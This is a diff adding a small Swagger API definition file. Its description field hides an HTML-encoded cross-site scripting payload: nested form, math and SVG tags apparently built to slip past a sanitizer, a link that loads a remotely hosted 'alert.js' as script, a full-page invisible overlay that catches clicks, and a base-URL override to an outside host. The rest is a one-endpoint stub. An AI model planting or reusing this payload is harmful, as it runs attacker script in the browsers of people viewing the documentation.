@@ -1,0 +1,20 @@
+swagger: &#39;2.0&#39;
+info:
+  title: Classic API Resource Documentation
+  description: |  
+    &lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id=&#34;&lt;/textarea&gt;&lt;a href=https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js data-type=script style=&#39;cursor: default;overflow: visible;width: 1000px;position: fixed;height: 2000px;margin: 0;display: block;box-sizing: initial;&#39; data-remote=true class=&#39;atwho-view select2-drop-mask pika-select&#39;&gt;&lt;div style=&#39;width: 100vw;height: 100vh;position: fixed;&#39;&gt;&lt;/div&gt;&lt;/a&gt;&lt;base href=&#39;https://ec2.ap-east-1.amazonaws.com/XD/&#39;&gt;&#34;&gt;&lt;/form&gt;
+
+  version: production
+basePath: /
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        &#39;200&#39;:
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
